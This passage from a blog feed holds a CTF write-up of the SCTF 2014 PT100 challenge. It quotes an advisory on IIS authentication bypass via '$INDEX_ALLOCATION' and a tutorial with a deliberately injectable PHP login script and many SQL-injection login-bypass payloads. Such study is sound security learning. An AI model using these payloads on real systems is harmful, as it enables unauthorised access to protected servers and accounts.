PI * r * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> r;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="function">CCube <span class="title">a_cube</span><span class="params">(7, 7, 7)</span></span>;</span><br><span class="line">    <span class="function">CSphere <span class="title">c_cube</span><span class="params">(1)</span></span>;</span><br><span class="line">    CStereoShape *p;</span><br><span class="line">    a_cube.setdate(<span class="number">4</span> , <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    p = &amp;a_cube;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"a_cube's area = "</span> &lt;&lt; p -&gt; GetArea() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"a_cube's volume = "</span> &lt;&lt; p -&gt; GetVolume() &lt;&lt; endl;</span><br><span class="line">    c_cube.setr(<span class="number">7</span>);</span><br><span class="line">    p = &amp;c_cube;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"b_cube's area = "</span> &lt;&lt; p -&gt; GetArea() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"b_cube's volume = "</span> &lt;&lt; p -&gt; GetVolume() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>1、 设计一个立体图形类（CStereoShape类），并满足如下要求：<br>•CStereoShape类有一个纯虚函数GetArea，能够获取立方体的表面积；<br>•CStereoShape类有一个纯虚函数GetVolume，能够获取立方体的体积；<br>]]>
    
    </summary>
    
      <category term="c++" scheme="http://edward-l.github.io/tags/c/"/>
    
      <category term="c++" scheme="http://edward-l.github.io/categories/c/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sctf_PT100中的一些姿势]]></title>
    <link href="http://edward-l.github.io/2014/12/09/sctf_PT100%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF/"/>
    <id>http://edward-l.github.io/2014/12/09/sctf_PT100中的一些姿势/</id>
    <published>2014-12-09T07:30:16.000Z</published>
    <updated>2014-12-09T01:02:45.000Z</updated>
    <content type="html"><![CDATA[<p>在sctf的pt100中学到的一些新姿势。<br>很简单的猜到后台。然后有一个基础的身份验证。神队友使用了黑魔法一样就绕过了。我补了一下姿势。网上查找了一下。是<code>iis＋php</code>的<a href="[http://packetstormsecurity.com/files/113497/iis-bypass.txt]">bypass</a><br><a id="more"></a><br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">THIS IS A GENUINE ISOWAREZ RELEASE</span><br><span class="line">********************************************************</span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">Title: Microsoft IIS <span class="number">6.0</span> <span class="operator">with</span> PHP installed Authentication Bypass</span><br><span class="line"></span><br><span class="line">Affected software:</span><br><span class="line">Microsoft IIS <span class="number">6.0</span> <span class="operator">with</span> PHP installed</span><br><span class="line">(tested <span class="command"><span class="keyword">on</span> <span class="title">Windows</span> <span class="title">Server</span> <span class="title">2003</span> <span class="title">SP1</span> <span class="title">running</span> <span class="title">PHP5</span>)</span></span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">By sending <span class="operator">a</span> special request <span class="built_in">to</span> <span class="operator">the</span> IIS <span class="number">6.0</span> Service running PHP <span class="operator">the</span> attacker can</span><br><span class="line">successfully bypass access restrictions.</span><br><span class="line"></span><br><span class="line">Take <span class="keyword">for</span> example:</span><br><span class="line"><span class="number">1.</span>) IIS/<span class="number">6.0</span> has PHP installed</span><br><span class="line"><span class="number">2.</span>) There is <span class="operator">a</span> Password Protected <span class="built_in">directory</span> configured</span><br><span class="line"><span class="comment">--&gt; An attacker can access PHP files in the password protected</span></span><br><span class="line"><span class="built_in">directory</span> <span class="operator">and</span> execute them <span class="keyword">without</span> supplying proper credentials.</span><br><span class="line"><span class="comment">--&gt; Example request (path to the file): /admin::$INDEX_ALLOCATION/index.php</span></span><br><span class="line"></span><br><span class="line">IIS/<span class="number">6.0</span> will gracefully <span class="built_in">load</span> <span class="operator">the</span> PHP <span class="built_in">file</span> inside <span class="operator">the</span> <span class="string">"admin"</span> <span class="built_in">directory</span></span><br><span class="line"><span class="keyword">if</span> <span class="operator">the</span> ::$INDEX_ALLOCATION postfix is appended <span class="built_in">to</span> <span class="built_in">directory</span> name.</span><br><span class="line">This can <span class="built_in">result</span> <span class="operator">in</span> accessing administrative <span class="built_in">files</span> <span class="operator">and</span> under special</span><br><span class="line">circumstances execute arbirary code remotely.</span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">Title: Microsoft IIS <span class="number">7.5</span> Classic ASP Authentication Bypass</span><br><span class="line"></span><br><span class="line">Affected Software:</span><br><span class="line">Microsoft IIS <span class="number">7.5</span> <span class="operator">with</span> configured Classic ASP <span class="operator">and</span> .NET Framework <span class="number">4.0</span></span><br><span class="line">installed (.NET Framework <span class="number">2.0</span> is unaffected, other .NET frameworks</span><br><span class="line">have <span class="operator">not</span> been tested)</span><br><span class="line">(tested <span class="command"><span class="keyword">on</span> <span class="title">Windows</span> <span class="title">7</span>)</span></span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">By appending <span class="string">":$i30:$INDEX_ALLOCATION"</span> <span class="built_in">to</span> <span class="operator">the</span> <span class="built_in">directory</span> serving <span class="operator">the</span></span><br><span class="line">classic ASP <span class="built_in">file</span> access restrictions can be successfully bypassed.</span><br><span class="line"></span><br><span class="line">Take this Example:</span><br><span class="line"><span class="number">1.</span>) Microsoft IIS <span class="number">7.5</span> has Classic ASP configured (<span class="keyword">it</span> allows serving .asp <span class="built_in">files</span>)</span><br><span class="line"><span class="number">2.</span>) There is <span class="operator">a</span> password protected <span class="built_in">directory</span> configured that has</span><br><span class="line">administrative asp scripts inside</span><br><span class="line"><span class="number">3.</span>) An attacker requests <span class="operator">the</span> <span class="built_in">directory</span> <span class="operator">with</span> :$i30:$INDEX_ALLOCATION</span><br><span class="line">appended <span class="built_in">to</span> <span class="operator">the</span> <span class="built_in">directory</span> name</span><br><span class="line"><span class="number">4.</span>) IIS/<span class="number">7.5</span> gracefully executes <span class="operator">the</span> ASP script <span class="keyword">without</span> asking <span class="keyword">for</span></span><br><span class="line">proper credentials</span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">Title: Microsoft IIS <span class="number">7.5</span> .NET source code disclosure <span class="operator">and</span> authentication bypass</span><br><span class="line"></span><br><span class="line">Affected Software:</span><br><span class="line">Microsoft IIS/<span class="number">7.5</span> <span class="operator">with</span> PHP installed <span class="operator">in</span> <span class="operator">a</span> special configuration</span><br><span class="line">(Tested <span class="operator">with</span> .NET <span class="number">2.0</span> <span class="operator">and</span> .NET <span class="number">4.0</span>)</span><br><span class="line">(tested <span class="command"><span class="keyword">on</span> <span class="title">Windows</span> <span class="title">7</span>)</span></span><br><span class="line">The special configuration requires <span class="operator">the</span> <span class="string">"Path Type"</span> <span class="operator">of</span> PHP <span class="built_in">to</span> be <span class="built_in">set</span> <span class="built_in">to</span></span><br><span class="line"><span class="string">"Unspecified"</span> <span class="operator">in</span> <span class="operator">the</span> Handler Mappings <span class="operator">of</span> IIS/<span class="number">7.5</span></span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">The authentication bypass is <span class="operator">the</span> same <span class="keyword">as</span> <span class="operator">the</span> previous vulnerabilities:</span><br><span class="line">Requesting <span class="keyword">for</span> example</span><br><span class="line"><span class="keyword">http</span>://&lt;victimIIS75&gt;/admin:$i30:$INDEX_ALLOCATION/admin.php will run</span><br><span class="line"><span class="operator">the</span> PHP script <span class="keyword">without</span> asking <span class="keyword">for</span> proper credentials.</span><br><span class="line"></span><br><span class="line">By appending /.php <span class="built_in">to</span> <span class="operator">an</span> ASPX <span class="built_in">file</span> (<span class="operator">or</span> <span class="keyword">any</span> other <span class="built_in">file</span> <span class="keyword">using</span> <span class="operator">the</span> .NET</span><br><span class="line">framework that is <span class="operator">not</span> blocked through <span class="operator">the</span> request filtering rules,</span><br><span class="line">like misconfigured: .CS,.VB <span class="built_in">files</span>)</span><br><span class="line">IIS/<span class="number">7.5</span> responds <span class="operator">with</span> <span class="operator">the</span> full source code <span class="operator">of</span> <span class="operator">the</span> <span class="built_in">file</span> <span class="operator">and</span> executes <span class="keyword">it</span></span><br><span class="line"><span class="keyword">as</span> PHP code. This means that <span class="keyword">by</span> <span class="keyword">using</span> <span class="operator">an</span> upload feature <span class="keyword">it</span> might be</span><br><span class="line">possible (under special circumstances) <span class="built_in">to</span> execute arbitrary PHP code.</span><br><span class="line">Example: Default.aspx/.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cheerio <span class="operator">and</span> signed,</span><br><span class="line"></span><br><span class="line">/Kingcope</span><br></pre></td></tr></table></figure></p>
<p>构造<code>payload</code>:<br><code>http://gintama.sycsec.com/admin:$i30:$INDEX_ALLOCATION/index.php</code></p>
<p>在后面是一个登录框，<code>airbasic</code>成功注入，他的<code>payload</code>是<code>&#39;|0#</code>，然后在<a href="[http://www.exploit-db.com/papers/18263/]">这里</a>发现了更多的姿势。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br></pre></td><td class="code"><pre><span class="line">This document is written <span class="keyword">for</span> publicizing of new SQL injection method <span class="keyword">about</span> detour some web firewall or some security solution. I did <span class="keyword">test</span> <span class="keyword">on</span> a web firewall made <span class="keyword">in</span> Korean, most SQL injection attack was hit, I will not reveal the maker <span class="keyword">for</span> cutting its damage.</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> <span class="keyword">order</span> to <span class="keyword">read</span> this document, you have to understand basic MySQL principles. I classified the term <span class="string">"SQL Injection" as 2 meanings. The first is a general SQL Injection, we usually call this "True SQL Injection", and the second is a "False SQL Injection". Though in this documentation, you can know something special about "True SQL Injection"</span></span><br><span class="line"></span><br><span class="line">And I <span class="keyword">mean</span> to say it's true that my method (False SQL Injection) is different from True/False SQL Injection mentioned <span class="keyword">in</span> <span class="string">"Blind SQL Injection"</span>. A tested environment was <span class="keyword">as</span> follow.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ubuntu server	11.04</span><br><span class="line">mysql		5.1.54-1</span><br><span class="line">Apache		2.2.17</span><br><span class="line">PHP		5.3.5-1</span><br><span class="line"></span><br><span class="line">A tested code was <span class="keyword">as</span> follow.</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line">create database injection_db;</span><br><span class="line">use injection_db;</span><br><span class="line">create table users(num int not null, id varchar(30) not null, password varchar(30) not null, primary key(num));</span><br><span class="line"></span><br><span class="line">insert into users values(1, 'admin', 'ad1234');</span><br><span class="line">insert into users values(2, 'wh1ant', 'wh1234');</span><br><span class="line">insert into users values(3, 'secuholic', 'se1234');</span><br><span class="line"></span><br><span class="line">*** login.php ***</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(empty(<span class="label">$_GET</span>['id']) || empty(<span class="label">$_GET</span>['password']))&#123;</span><br><span class="line">  echo <span class="string">"&lt;html&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;body&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;form name='text' action='login.php' method='get'&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;h4&gt;ID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type='text' name='id'&gt;&lt;br&gt;"</span>;</span><br><span class="line">  echo <span class="string">"PASS&lt;input type='password' name='password'&gt;&lt;br&gt;&lt;/h4&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;input type='submit' value='Login'&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;/form&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;/body&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;/html&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="label">$id</span> = <span class="label">$_GET</span>['id'];</span><br><span class="line">  <span class="label">$password</span> = <span class="label">$_GET</span>['password'];</span><br><span class="line"></span><br><span class="line">  <span class="label">$dbhost</span> = 'localhost';</span><br><span class="line">  <span class="label">$dbuser</span> = 'root';</span><br><span class="line">  <span class="label">$dbpass</span> = 'pass';</span><br><span class="line">  <span class="label">$database</span> = 'injection_db';</span><br><span class="line"></span><br><span class="line">  <span class="label">$db</span> = mysql_connect(<span class="label">$dbhost</span>, <span class="label">$dbuser</span>, <span class="label">$dbpass</span>);</span><br><span class="line">  mysql_select_db(<span class="label">$database</span>,<span class="label">$db</span>);</span><br><span class="line">  <span class="label">$sql</span> = mysql_query(<span class="string">"select * from users where id='$id' and password='$password'"</span>) or die (mysql_error());</span><br><span class="line"></span><br><span class="line">  <span class="label">$row</span> = mysql_fetch_array(<span class="label">$sql</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="label">$row</span>[id] &amp;&amp; <span class="label">$row</span>[password])&#123;</span><br><span class="line">    echo <span class="string">"&lt;font color=#FF0000&gt;&lt;h1&gt;"."Login sucess"."&lt;/h1&gt;&lt;/u&gt;&lt;br&gt;"</span>;</span><br><span class="line">    echo <span class="string">"&lt;h3&gt;&lt;font color=#000000&gt;"."Hello, "."&lt;/u&gt;"</span>;</span><br><span class="line">    echo <span class="string">"&lt;font color=#D2691E&gt;".$row[id]."&lt;/u&gt;&lt;/h3&gt;&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">"&lt;script&gt;alert('Login failed');&lt;/script&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mysql_close(<span class="label">$db</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">First, basic SQL Injection is <span class="keyword">as</span> follow.</span><br><span class="line">' or 1=1#</span><br><span class="line"></span><br><span class="line">The code above is general SQL Injection Code, and this writer classified the code <span class="keyword">as</span> <span class="string">"True SQL Injection". When you log on to some site, in internal of web program, your id and password are identified by some statement used "</span>select id, password from <span class="keyword">table</span> where id='' and password='', you can easily understand when you think 0 <span class="keyword">about</span> character single quotation <span class="keyword">mark</span>. Empty space is same <span class="keyword">as</span> 0, the attack is possible using = and 0. <span class="keyword">As</span> a result, following statement enables <span class="keyword">log</span> <span class="keyword">on</span> process.</span><br><span class="line"></span><br><span class="line">'=0#</span><br><span class="line"></span><br><span class="line">We can apply it <span class="keyword">in</span> a different way.</span><br><span class="line"></span><br><span class="line">This is possible <span class="keyword">as</span> 0&gt;-1</span><br><span class="line">'&gt;-1#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Also, this is possible <span class="keyword">as</span> 0&lt;1</span><br><span class="line">'&lt;1#</span><br><span class="line"></span><br><span class="line">You don't have to <span class="keyword">use</span> only single figures. You can <span class="keyword">use</span> <span class="keyword">two</span> figures attack <span class="keyword">as</span> follow.</span><br><span class="line">1'&lt;99#</span><br><span class="line"></span><br><span class="line">Comparison operation 0=1 will be 0, the following operation result is true because of id=''=0(0=1).</span><br><span class="line"></span><br><span class="line">'=0=1#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Additionally there is some possible comparison operation making the same value each other.</span><br><span class="line"></span><br><span class="line">'&lt;=&gt;0#</span><br><span class="line"></span><br><span class="line">Like this, <span class="keyword">if</span> you <span class="keyword">use</span> the comparison operation, you can attack <span class="keyword">as</span> additional manner.</span><br><span class="line"></span><br><span class="line">'=0=1=1=1=1=1#</span><br><span class="line">'=1&lt;&gt;1#</span><br><span class="line">'&lt;&gt;1#</span><br><span class="line">1'&lt;&gt;99999#</span><br><span class="line">'!=2!=3!=4#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> this time, you get the turn <span class="keyword">on</span> understanding False SQL injection. the following is not attack but operation <span class="keyword">for</span> MySQL.</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+-----+-----------+----------+</span><br><span class="line">| num | id        | password |</span><br><span class="line">+-----+-----------+----------+</span><br><span class="line">|   1 | admin     | ad1234   |</span><br><span class="line">|   2 | wh1ant    | wh1234   |</span><br><span class="line">|   3 | secuholic | se1234   |</span><br><span class="line">+-----+-----------+----------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="keyword">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">This shows the contents <span class="keyword">in</span> any <span class="keyword">table</span> without any problem.</span><br><span class="line">The following is the content when you don't <span class="keyword">input</span> any value <span class="keyword">in</span> the id</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id='';</span><br><span class="line">Empty <span class="keyword">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Of course there is not result because id field dosen't have any string.</span><br><span class="line"><span class="keyword">In</span> the truth, I have seen the case that <span class="keyword">in</span> the MySQL <span class="keyword">if</span> string field has a 0, the result is true. Based <span class="keyword">on</span> the truth, following statement is true.</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=0;</span><br><span class="line">+-----+-----------+----------+</span><br><span class="line">| num | id        | password |</span><br><span class="line">+-----+-----------+----------+</span><br><span class="line">|   1 | admin     | ad1234   |</span><br><span class="line">|   2 | wh1ant    | wh1234   |</span><br><span class="line">|   3 | secuholic | se1234   |</span><br><span class="line">+-----+-----------+----------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="keyword">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you <span class="keyword">input</span> 0 <span class="keyword">in</span> id, All the content is showed. This is the basic <span class="keyword">about</span> <span class="string">"False SQL Injection"</span>. After all, result of 0 makes <span class="keyword">log</span> <span class="keyword">on</span> process success. <span class="keyword">For</span> making the result 0, 